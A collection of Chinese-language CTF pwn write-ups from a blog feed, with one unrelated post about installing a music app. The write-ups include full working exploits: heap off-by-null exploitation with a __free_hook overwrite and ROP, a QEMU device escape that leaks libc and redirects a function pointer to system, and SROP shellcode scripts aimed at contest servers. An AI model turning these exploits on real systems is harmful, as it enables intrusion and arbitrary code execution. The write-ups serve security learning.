76add(0x28,&#39;77&#39;) #3 77add(0x28,&#39;78&#39;) #4 78for i in range(7):    delete(64+i)delete(75) #1delete(77) #3# fastbin 3 -&gt; 1for i in range(7):    add(0x28,&#39;i&#39;)add(0x618,&#39;75&#39;) # consolidate fastbin -&gt; smallbin ; smallbin 1 fd-&gt; 3# 进入smallbin之后 chunk3的bk指向chunk1 被修改为了堆地址 可以一字节修改为指向fake_chunk (0x0010)# 用于过unlink的check FD-&gt;bkadd(0x28,b&#39;b&#39; * 8 + p8(0x10)) #chunk3 77 修改chunk3 bk为fake_chunkadd(0x28,&#39;chunk1&#39;)  # 79 被重叠的块for i in range(7):    delete(64+i)delete(78) #4delete(74) #0#fastbin 0 -&gt; 4#修改chunk0的fd为堆地址 用于过unlink的checkfor i in range(7):    add(0x28,&#39;i&#39;)add(0x28,p8(0x10)) #0 74# 修改一字节 用于过unlink的check BK-&gt;fdadd(0x28,b&#39;c&#39; * 0x20+p64(0xe0)) #4  78# 0xe0为伪造的prev_size# offbynull 修改size 0x501-&gt;0x500add(0x4f8,&#39;n&#39;) #80delete(80)# 构造完成后 free时 size=0x500 即 prev_inuse = 0 向前寻址# 发现构造的fake_chunk size=0xe1 成功过2.29的check# 然后fd = 0x555555760090 即chunk3 chunk3的bk经过伪造为fake_chunk# bk = 0x555555760000 即chunk0 bk-&gt;fd 也经过伪造指向fake chunk 成功过checkadd(0x18,&#39;80&#39;)libc_base = u64(show(79).ljust(8,b&#39;\x00&#39;)) - 0x1EBBE0log.success(&#39;libc_base = &#39; + hex(libc_base))libc.address = libc_baseadd(0x38,&#39;81&#39;)delete(18)delete(81)heap_base = u64(show(79).ljust(8,b&#39;\x00&#39;)) + 0x6cf0log.info(&#39;heap_base = &#39; +hex(heap_base))add(0xe8,&#39;18&#39;)delete(60)delete(18)delete(76)add(0x28,p64(0) + p64(0x31) + p64(libc.symbols[&#39;__free_hook&#39;]))add(0xe8,&#39;a&#39;)rdx_gadget = libc_base + 0x0000000000154930rdi_ret = libc_base + 0x0000000000026b72rsi_ret = libc_base + 0x0000000000027529rdx_r12_ret = libc_base + 0x000000000011c371ret = libc_base + 0x0000000000025679syscall = libc_base + 0x0000000000066229rax_ret = libc_base + 0x000000000004a550#0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; flag_addr =heap_base + 0x600buf_addr= heap_base + 0x1000rop = p64(rdi_ret) + p64(flag_addr) + p64(rsi_ret) + p64(0) + p64(rax_ret) + p64(constants.SYS_open) + p64(syscall)rop += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc.symbols[&#39;read&#39;])rop += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(buf_addr) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc.symbols[&#39;write&#39;])add(0x618,rop) #76rop_addr = heap_base + 0x1260frame = SigreturnFrame()frame.rip = retframe.rsp = rop_addradd(0x618,str(frame))payload = p64(rdx_gadget) + p64(libc.symbols[&#39;__free_hook&#39;] + 0x10) + p64(0) * 4 + p64(libc.symbols[&#39;setcontext&#39;] + 61) + bytes(frame)[0x28:]log.info(hex(len(payload)))add(0xe8,payload[:0xe8]) #81# gdb.attach(sh,&quot;b * $rebase(0xdbf)&quot;)sh.sendline(&#39;2&#39;)sh.sendline(&#39;82&#39;)sh.interactive()</code></pre><h1 id="DASCTF2020-MAR-happyending"><a href="#DASCTF2020-MAR-happyending" class="headerlink" title="DASCTF2020-MAR happyending"></a>DASCTF2020-MAR happyending</h1><p>和plainnote基本完全一样,还去掉了seccomp</p><h2 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import *context.log_level = &#39;DEBUG&#39;context.timeout = 1context.arch = &#39;amd64&#39;context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]sh = process(&#39;./happyending&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;length :\n&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;them!\n&#39;)    sh.send(content)    sh.recvuntil(&#39;&gt;\n&#39;)def delete(index):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;debuff :\n&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;&gt;\n&#39;)def show(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;blessing :\n&#39;)    sh.sendline(str(index))    data = sh.recvuntil(&#39;1.add&#39;,drop=True)    sh.recvuntil(&#39;&gt;\n&#39;)    return dataadd(0x1000,&#39;a&#39;) #0for i in range(7): # 1-7    add(0x28,&#39;a&#39;)for i in range(7): # 8-14    add(0x18,&#39;a&#39;) add(0x5b20,&#39;gap&#39;) #15add(0x5e0,&#39;tot&#39;)  #16add(0x18,&#39;zz&#39;) #17delete(16)add(0x618,&#39;z&#39;) #16add(0x28,b&#39;a&#39; * 8 + p64(0xe1) + p8(0x90)) #18 0add(0x28,&#39;a&#39;) #19 1add(0x28,&#39;a&#39;) #20 2add(0x28,&#39;a&#39;) #21 3add(0x28,&#39;a&#39;) #22 4for i in range(7):    delete(i+1)delete(19) #1 delete(21) #3for i in range(7):    add(0x28,&#39;a&#39;) #8-14add(0x618,&#39;19&#39;) #19add(0x28,b&#39;b&#39;*8 + p8(0x10)) #3 21add(0x28,&#39;1&#39;) #1 23for i in range(7):    delete(i+1)delete(22) #4delete(18) #0for i in range(7):    add(0x28,&#39;a&#39;) #8-14add(0x28,p8(0x10)) #0add(0x28,b&#39;c&#39; * 0x20+p64(0xe0)) #4add(0x4f8,&#39;a&#39;) #24delete(24)add(0x18,&#39;24&#39;)libc_base = u64(show(23).ljust(8,b&#39;\x00&#39;))- 0x1EBBE0log.success(&quot;libc_base = &quot; + hex(libc_base)) libc.address = libc_basesystem = libc.symbols[&#39;system&#39;]free_hook = libc.symbols[&#39;__free_hook&#39;]add(0x8,&#39;qqqqq&#39;)add(0x38,b&#39;a&#39;*8 + p64(0x31))delete(1)delete(20)delete(26)add(0x38,p64(0) + p64(0x31) + p64(free_hook))add(0x28,&#39;/bin/sh\x00&#39;)add(0x28,p64(system))sh.sendline(&#39;2&#39;)sh.sendline(&#39;20&#39;)# gdb.attach(sh,&#39;b * $rebase(0x16da)&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网易云UWP版安装/配置相关细节</title>
      <link href="/2021/03/26/wangyiyun-uwp-install/"/>
      <url>/2021/03/26/wangyiyun-uwp-install/</url>
      
        <content type="html"><![CDATA[<p>在另一台电脑上折腾了一下一直用的网易云UWP版的安装细节.</p><a id="more"></a><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>从<a href="https://github.com/JasonWei512/NetEase-Cloud-Music-UWP-Repack" target="_blank" rel="noopener">这里</a>下载uwp安装包，然后按照说明安装。<br>如果连接不上microsoft store记得关代理。</p><h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><p>参考<a href="https://www.bilibili.com/read/cv9556360" target="_blank" rel="noopener">这里</a></p><h1 id="在开了系统代理的情况下显示网络错误的解决办法"><a href="#在开了系统代理的情况下显示网络错误的解决办法" class="headerlink" title="在开了系统代理的情况下显示网络错误的解决办法"></a>在开了系统代理的情况下显示网络错误的解决办法</h1><p>参考<a href="https://zhuanlan.zhihu.com/p/29989157" target="_blank" rel="noopener">这里</a>,找到网易云uwp的SID即可.</p><p>更快捷的方法,我使用的NetLimiterPro自带显示SID,无需打开regedit.<br>clash安装目录下自带<code>EnableLoopback.exe</code>,直接勾选也可以.</p><p>之后就可以正常使用了.</p>]]></content>
      
      
      
        <tags>
            
            <tag> others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>d3ctf-qemu逃逸-d3dev writeup</title>
      <link href="/2021/03/07/d3ctf-qemu-escape-d3dev-writeup/"/>
      <url>/2021/03/07/d3ctf-qemu-escape-d3dev-writeup/</url>
      
        <content type="html"><![CDATA[<p>d3ctf pwn题 d3dev writeup<br>qemu逃逸详细利用过程</p><a id="more"></a><p>[TOC]</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>建议阅读</p><blockquote><p> <a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#qemu%E6%A6%82%E8%BF%B0" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#qemu%E6%A6%82%E8%BF%B0</a></p></blockquote><p>简单总结一下的话就是qemu逃逸的题目会加载一个设备,并且编写和这个设备进行读写交互的函数,漏洞就出在那几个函数里面,利用方式和kernel pwn类似,用c编写和设备交互的代码,控制程序执行流.</p><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><h2 id="launch-sh"><a href="#launch-sh" class="headerlink" title="launch.sh"></a>launch.sh</h2><pre><code class="bash">#!/bin/sh./qemu-system-x86_64 \-L pc-bios/ \-s \-m 128M \-kernel vmlinuz \-initrd rootfs.img \-smp 1 \-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet&quot; \-device d3dev \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-nographic \</code></pre><p>注意<code>-device d3dev</code>这一行,设备名字就叫d3dev</p><h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><p>一开始想在16.04上跑qemu,结果显示少<code>libncursesw.so.6</code>.</p><p>题目有提供<code>dockerfile</code>,但是这样调试不方便,最后选择用最新的<code>pwndocker</code>跑,需要额外装两个库</p><pre><code class="bash">apt install libpixman-1-devapt install libsnappy-dev</code></pre><p>之后就可以跑<code>launch.sh</code>了</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>使用IDA7.5打开qemu-system-x86_64,等到分析完毕之后在左边函数列表搜索<code>d3dev</code>,就能见到相关的函数</p><pre><code class="c">d3dev_class_initd3dev_instance_initd3dev_mmio_readd3dev_mmio_writed3dev_pmio_readd3dev_pmio_writedo_qemu_init_pci_d3dev_register_typespci_d3dev_realizepci_d3dev_register_types</code></pre><p>先进入<code>d3dev_class_init</code>函数,将v2的类型修改为<code>PCIDeviceClass *</code>,就可以看到设备初始化的相关信息.</p><pre><code class="c">void __fastcall d3dev_class_init(ObjectClass_0 *a1, void *data){  PCIDeviceClass *v2; // rax  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(                           a1,                           (const char *)&amp;env.tlb_table[1][115]._anon_0.dummy[31],                           &quot;/home/eqqie/CTF/qemu-escape/qemu-source/qemu-3.1.0/hw/misc/d3dev.c&quot;,                           229,                           &quot;d3dev_class_init&quot;);  v2-&gt;realize = pci_d3dev_realize;  v2-&gt;exit = 0LL;  *(_DWORD *)&amp;v2-&gt;vendor_id = 0x11E82333;  v2-&gt;revision = 0x10;  v2-&gt;class_id = 0xFF;}</code></pre><p>在qemu中执行<code>lspci</code>执行查看设备信息</p><pre><code class="bash">/ # lspci00:01.0 Class 0601: 8086:700000:04.0 Class 0200: 8086:100e00:00.0 Class 0600: 8086:123700:01.3 Class 0680: 8086:711300:03.0 Class 00ff: 2333:11e800:01.1 Class 0101: 8086:701000:02.0 Class 0300: 1234:1111</code></pre><p>根据init函数中的信息比对发现可以确定是<code>00:03.0 Class 00ff: 2333:11e8</code></p><p>然后输入<code>cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</code></p><pre><code class="bash">/ # cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource0x00000000febf1000 0x00000000febf17ff 0x00000000000402000x000000000000c040 0x000000000000c05f 0x00000000000401010x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x0000000000000000</code></pre><p>确定了PMIO端口号是从<code>c040-c05f</code>,MMIO地址空间是<code>febf1000 - febf17ff</code></p><p>然后就可以分析这个设备的读写函数了,漏洞就出在读写函数中.</p><pre><code class="c">uint64_t __fastcall d3dev_mmio_read(struct d3devState *opaque, hwaddr addr, unsigned int size){  uint64_t block_seeked; // rax  unsigned int v4; // esi  unsigned int x; // ecx  uint64_t y; // rax  block_seeked = opaque-&gt;blocks[opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3)];  v4 = 0xC6EF3720;  x = block_seeked;                             // X  y = HIDWORD(block_seeked);                    // Y  do  {    LODWORD(y) = y - ((x + v4) ^ (opaque-&gt;key[3] + (x &gt;&gt; 5)) ^ (opaque-&gt;key[2] + 16 * x));    x -= (y + v4) ^ (opaque-&gt;key[1] + ((unsigned int)y &gt;&gt; 5)) ^ (opaque-&gt;key[0] + 16 * y);    v4 += 0x61C88647;                           // range(20) v4 = 0x D 0000 0000 == 0  }  while ( v4 );  if ( opaque-&gt;mmio_read_part )  {    opaque-&gt;mmio_read_part = 0;    y = (unsigned int)y;  }  else  {    opaque-&gt;mmio_read_part = 1;    y = x;  }  return y;}void __fastcall d3dev_mmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size){  __int64 v4; // rsi  ObjectClass_0 **v5; // r11  uint64_t v6; // rdx  int i; // esi  uint32_t key0; // er10  uint32_t key1; // er9  uint32_t key2; // er8  uint32_t key3; // edi  unsigned int x; // ecx  uint64_t y; // rax  if ( size == 4 )  {    v4 = opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3);    if ( opaque-&gt;mmio_write_part )    {      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;      v6 = val &lt;&lt; 32;      i = 0;      opaque-&gt;mmio_write_part = 0;      key0 = opaque-&gt;key[0];      key1 = opaque-&gt;key[1];      key2 = opaque-&gt;key[2];      key3 = opaque-&gt;key[3];      x = v6 + *((_DWORD *)v5 + 0x2B6);      y = ((unsigned __int64)v5[0x15B] + v6) &gt;&gt; 32;      do      {        i -= 0x61C88647;        x += (i + y) ^ (key1 + ((unsigned int)y &gt;&gt; 5)) ^ (key0 + 16 * y);        LODWORD(y) = ((i + x) ^ (key3 + (x &gt;&gt; 5)) ^ (key2 + 16 * x)) + y;      }      while ( i != 0xC6EF3720 );                // range(20)      v5[0x15B] = (ObjectClass_0 *)__PAIR64__(y, x);    }    else    {      opaque-&gt;mmio_write_part = 1;      opaque-&gt;blocks[v4] = (unsigned int)val;    }  }}void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size){  uint32_t *v4; // rbp  if ( addr == 8 )  {    if ( val &lt;= 0x100 )      opaque-&gt;seek = val;  }  else if ( addr &gt; 8 )  {    if ( addr == 28 )    {      opaque-&gt;r_seed = val;      v4 = opaque-&gt;key;      do        *v4++ = ((__int64 (__fastcall *)(uint32_t *, __int64, uint64_t, _QWORD))opaque-&gt;rand_r)(                  &amp;opaque-&gt;r_seed,                  28LL,                  val,                  *(_QWORD *)&amp;size);      while ( v4 != (uint32_t *)&amp;opaque-&gt;rand_r );    }  }  else if ( addr )  {    if ( addr == 4 )    {      *(_QWORD *)opaque-&gt;key = 0LL;      *(_QWORD *)&amp;opaque-&gt;key[2] = 0LL;    }  }  else  {    opaque-&gt;memory_mode = val;  }}</code></pre><p>其中可以将<code>void * opaque</code>的类型修改为<code>struct d3devState*</code>,一开始在struct列表中会搜索不到<code>d3devState</code></p><p>解决方法参照<a href="https://www.anquanke.com/post/id/197650#h2-9" target="_blank" rel="noopener">这份wp下面的评论</a></p><blockquote><p>这儿有个坑忘提了. IDA 貌似有些结构体不会解析到idb数据库中, 得自己添加. 方法如下: View -&gt; Open Subviews -&gt; Local Types. 然后搜索 STRNGState 就能找到了. (如果找不到的话可能这个符号被去掉了, 可能只能自己新建) 双击添加进 Database 即可</p></blockquote><p>同样步骤,搜索d3devState就行.</p><p>越界读漏洞出在<code>d3dev_mmio_read</code>函数中</p><p><code>block_seeked = opaque-&gt;blocks[opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3)];</code></p><p>其中的<code>seek</code>在<code>d3dev_pmio_write</code>中可控,范围是0到0x100</p><pre><code class="c">  if ( addr == 8 )  {    if ( val &lt;= 0x100 )      opaque-&gt;seek = val;  }</code></pre><p>因此可以越界读数据,可读取的内容可以在gdb中调试查看:</p><pre><code class="c">  memory_mode = 0,  seek = 0,  init_flag = 1,  mmio_read_part = 0,  mmio_write_part = 0,  r_seed = 0,  blocks = {0 &lt;repeats 257 times&gt;},  key = {271647815, 157742283, 1457023107, 1189018626},  rand_r = 0x7f143691deb0 &lt;rand_r&gt;}pwndbg&gt; </code></pre><p>显然可以通过<code>rand_r</code>获取libc的地址.</p><p>越界写漏洞出现在<code>d3dev_mmio_write</code>中,与<code>mmio_read</code>的漏洞点相同.</p><p><code>v4 = opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3);</code></p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>有越界读写,并且在<code>d3dev_pmio_write</code>函数中有<code>rand_r</code>函数指针的调用,思路就很明显了,先泄露libc地址,然后越界写<code>rand_r</code>指针为system,最后调用即可.</p><p>在利用时有几个细节值得注意:</p><ol><li><p>mmio_read以及mmio_write的过程经过了加解密,read是将内容加密后分两次传回,write是将密文分两次读入后解密再写入.</p></li><li><p><code>d3dev_pmio_write</code>中可以将加解密中的key设置成0,极大提高分析效率.</p></li><li><p>因为<code>r_seed</code>和<code>blocks</code>内存地址连续,因此可以将字符串连起来写入<code>r_seed</code>和<code>block[0]</code>中,然后触发调用<code>rand_r</code></p><pre><code class="bash">pwndbg&gt; p &amp;((d3devState *)$rdi).r_seed $2 = (uint32_t *) 0x5598a2141b34pwndbg&gt; p &amp;((d3devState *)$rdi).blocks $3 = (uint64_t (*)[257]) 0x5598a2141b38</code></pre></li></ol><h1 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h1><p>文件系统相关的话,与kernel题目一样,先解压(推荐单独开个文件夹)</p><p><code>cpio -idmv &lt; rootfs.img</code></p><p>然后将exp写好后放进fs文件夹中</p><p><code>gcc -O0 -o exp -static d3dev.c</code></p><p>之后打包</p><p><code>find . | cpio -o --format=newc &gt; ../rootfs.img</code></p><p>重新跑<code>launch.sh</code>就行了</p><p>我本地的环境是20.04的pwndocker + pwngdb + tmux,在启动qemu之后tmux新开窗口,然后<code>ps -ax</code></p><pre><code class="bash">ID TTY      STAT   TIME COMMAND     1 ?        Ss     0:00 /usr/bin/python3 -u /sbin/my_init    13 ?        S      0:01 /usr/sbin/syslog-ng --pidfile /var/run/syslog-ng.pid -F --no-caps    27 ?        S      0:00 /usr/bin/runsvdir -P /etc/service    28 ?        Ss     0:00 runsv sshd    29 ?        Ss     0:00 runsv cron    30 ?        S      0:00 /usr/sbin/cron -f    33 pts/0    Ss     0:00 /bin/bash    45 pts/0    S+     0:00 tmux    47 ?        Ss     0:10 tmux   787 pts/2    Ss     0:00 -bash   830 pts/2    S+     0:00 /bin/sh ./launch.sh   831 pts/2    Sl+    0:10 ./qemu-system-x86_64 -L pc-bios/ -s -m 128M -kernel vmlinuz -initr   838 pts/1    Ss     0:00 -bash   871 pts/1    R+     0:00 ps -ax</code></pre><p>找到qemu的pid后<code>gdb attach 831</code>即可下断点调试,在qemu中执行exp即可被断下.</p><p>调试时查看结构体可以在d3dev相关函数断点下</p><p><code>p *((d3devState *)$rdi)</code></p><p>就可以查看了</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>exp模版来自于<a href="https://github.com/rcvalle/blizzardctf2017/blob/master/strng.c" target="_blank" rel="noopener">这里</a></p><pre><code class="c">#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;unsigned char* mmio_mem;uint32_t pmio_base = 0xc040; //cat /sys/devices/pci0000\:00/0000\:00\:03.0/resourceuint32_t keys[4] = {0};uint64_t libc_base ;void die(const char* msg){    perror(msg);    exit(-1);}void mmio_write(uint32_t addr, uint32_t value){    *((uint32_t*)(mmio_mem + addr)) = value;}uint32_t mmio_read(uint32_t addr){    return *((uint32_t*)(mmio_mem + addr));}void pmio_write(uint32_t addr, uint32_t value){    outl(value,addr);}uint32_t pmio_read(uint32_t addr){    return (uint32_t)inl(addr);}uint32_t pmio_arbread(uint32_t offset){    pmio_write(pmio_base+0,offset);    return pmio_read(pmio_base+4);}void pmio_abwrite(uint32_t offset, uint32_t value){    pmio_write(pmio_base+0,offset);    pmio_write(pmio_base+4,value);}void reset_keys(){    uint32_t seed = 0;    for(int i = 0;i&lt;4;++i)    {        keys[i] = rand_r(&amp;seed);        printf(&quot;keys[%d] test = %p\n&quot;,i, keys[i]);    }    pmio_write(28 + pmio_base,0);    pmio_write(4 + pmio_base,0);    return ;}void set_seek_off(uint32_t offset){    pmio_write(8 + pmio_base,offset);}uint64_t decrypt(uint32_t x, uint64_t y){    uint32_t i = 0;    do    {        i -=0x61C88647;        x += (i + y) ^ ( ((unsigned int)y &gt;&gt; 5)) ^ (  y &lt;&lt; 4);        y = (uint32_t)(((i + x) ^ ((x &gt;&gt; 5)) ^ (  x &lt;&lt; 4)) + y);    } while (i != 0xC6EF3720);    printf(&quot;x = %p, y = %p , i = %p\n&quot;,x,y,i);    uint64_t ans = (y &lt;&lt; 32) + x;    printf(&quot;ans = %p\n&quot;,ans);    return ans - 0x4AEB0;}uint64_t encrypt(uint64_t rr){    uint32_t i , x ;    uint64_t y;    i  = 0xC6EF3720;    x = rr &amp; 0xffffffff ;     y = rr &gt;&gt; 32 ;    do    {        y = (uint32_t)(y - ((x + i) ^ (x &gt;&gt; 5) ^ ( x &lt;&lt; 4 )));        x = x - (((y + i) ^ (y &gt;&gt; 5) ^ ( y &lt;&lt; 4 ) )) ;        i = i + 0x61C88647;    } while (i);    printf(&quot;x = %p, y = %p , i = %p\n&quot;,x,y,i);    return  (y &lt;&lt; 32) + x;}int main(int argc, char *argv[]){    uint32_t tmp = 0xdeadbeef;    uint32_t tmp1 = 0;    uint32_t tmp2 = 0;    // Open and map I/O memory for the strng device    int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;, O_RDWR | O_SYNC);    if (mmio_fd == -1)        die(&quot;mmio_fd open failed&quot;);    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if (mmio_mem == MAP_FAILED)        die(&quot;mmap mmio_mem failed&quot;);    printf(&quot;mmio_mem @ %p\n&quot;, mmio_mem);    tmp = mmio_read(24);    printf(&quot;tmp test = %p\n&quot;, tmp);    // Open and map I/O memory for the strng device    if (iopl(3) !=0 )        die(&quot;I/O permission is not enough&quot;);    reset_keys();    set_seek_off(0x100);    // get rand_r     uint64_t yy;    uint32_t xx;    yy = mmio_read(24);    printf(&quot;tmp1 test = %p\n&quot;, yy); // part 1    xx = mmio_read(24);    printf(&quot;tmp2 test = %p\n&quot;, xx); // part 2 high    libc_base = decrypt(xx,yy);    printf(&quot;libc_base = %p\n&quot;,libc_base);    uint64_t system = libc_base + 0x0000000000055410;    printf(&quot;system = %p\n&quot;,system);    mmio_write(24, (uint32_t)(encrypt(system)));    mmio_write(24, (uint32_t)(encrypt(system) &gt;&gt; 32));    // char sed[4] = &quot;cat &quot;;    // char flag[8] = &quot;/home/ct&quot;;    // char flag2[8] = &quot;f/flag\x00&quot;;    uint32_t flag1 = 0x20746163; //&quot;cat &quot;    uint64_t flag2 = 0x67616c66; // &quot;flag&quot;    // uint64_t flag3 = 0x67616c662f66;    set_seek_off(0);    mmio_write(0, (uint32_t)(encrypt(flag2)));    mmio_write(0, (uint32_t)(encrypt(flag2) &gt;&gt; 32));    // mmio_write(8, (uint32_t)(encrypt(flag3)));    // mmio_write(8, (uint32_t)(encrypt(flag3) &gt;&gt; 32));    pmio_write(28 + pmio_base,flag1);}</code></pre><h1 id="远程传exp"><a href="#远程传exp" class="headerlink" title="远程传exp"></a>远程传exp</h1><p>远程脚本来自于<a href="https://binlep.github.io/2020/03/12/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91Linux%20Kernel%20%E8%B0%83%E8%AF%95%E6%96%87%E4%BB%B6%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">这里</a></p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import oscontext.log_level = &#39;debug&#39;cmd = &#39;/ #&#39;def exploit(r):    r.sendlineafter(cmd, &#39;stty -echo&#39;)    os.system(&#39;gcc -static -O0 ./d3dev.c -o ./exp&#39;)    os.system(&#39;gzip -c ./exp &gt; ./exp.gz&#39;)    r.sendlineafter(cmd, &#39;cat &lt;&lt;EOF &gt; exp.gz.b64&#39;)    r.sendline((read(&#39;./exp.gz&#39;)).encode(&#39;base64&#39;))    r.sendline(&#39;EOF&#39;)    r.sendlineafter(cmd, &#39;base64 -d exp.gz.b64 &gt; exp.gz&#39;)    r.sendlineafter(cmd, &#39;gunzip ./exp.gz&#39;)    r.sendlineafter(cmd, &#39;chmod +x ./exp&#39;)    r.sendlineafter(cmd, &#39;./exp&#39;)    r.interactive()# p = process(&#39;./startvm.sh&#39;, shell=True)p = remote(&#39;106.14.216.214&#39;,50273)exploit(p)</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.giantbranch.cn/2020/01/13/CTF%20QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E4%B9%8B%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E7%BA%BF%E4%B8%8A%E8%B5%9Bqwct/" target="_blank" rel="noopener">https://www.giantbranch.cn/2020/01/13/CTF%20QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E4%B9%8B%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E7%BA%BF%E4%B8%8A%E8%B5%9Bqwct/</a></p><p><a href="https://ray-cp.github.io/archivers/qemu-pwn-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E4%B8%A4%E9%81%93qemu%E9%80%83%E9%80%B8%E9%A2%98writeup#%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/qemu-pwn-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E4%B8%A4%E9%81%93qemu%E9%80%83%E9%80%B8%E9%A2%98writeup#%E5%88%86%E6%9E%90</a></p><p><a href="https://www.anquanke.com/post/id/197650#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197650#h2-0</a></p><p><a href="https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup#%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup#%E5%88%86%E6%9E%90</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x41414141ctf_pwn_wp</title>
      <link href="/2021/01/27/0x41414141ctf-pwn-wp/"/>
      <url>/2021/01/27/0x41414141ctf-pwn-wp/</url>
      
        <content type="html"><![CDATA[<p>0x41414141ctf pwn题 writeup<br>这比赛难度很友好</p><a id="more"></a><h1 id="Moving-signals"><a href="#Moving-signals" class="headerlink" title="Moving signals"></a>Moving signals</h1><p>短小精悍,没开nx保护,直接srop即可</p><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;context.arch = &#39;amd64&#39;# sh = process(&#39;./moving-signals&#39;)sh = remote(&#39;185.172.165.118&#39;,2525)# gdb.attach(sh)# pause()sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = 0x41100sigframe.rdx = 0x400sigframe.rsp = 0x41100sigframe.rip = 0x41015payload = &#39;a&#39; * 8 payload += p64(0x41018)payload += p64(15)payload += p64(0x41015)payload += str(sigframe)payload = payload.ljust(0x1F4,&#39;\x00&#39;)sh.send(payload)sh.sendline(p64(0x41108) + asm(shellcraft.sh()))sh.interactive()</code></pre><h1 id="external"><a href="#external" class="headerlink" title="external"></a>external</h1><p>rop,但是执行了函数把got表清0了,没法直接调plt,因此用syscall read,往got表中读,恢复got表中初始内容(动态链接前的got表内容是plt表call指令的下一条指令的地址,具体参见动态链接过程)就可以了.</p><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;# sh = process(&quot;./external&quot;)sh =remote(&#39;161.97.176.150&#39;,9999)# libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)libc = ELF(&#39;./libc-2.28.so&#39;)# gdb.attach(sh,&#39;b * 0x40125F&#39;)# pause()sh.recvuntil(&#39;&gt; &#39;)syscall = 0x401283 syswrite = 0x40127crdi_ret = 0x00000000004012f3rsi_r15_ret = 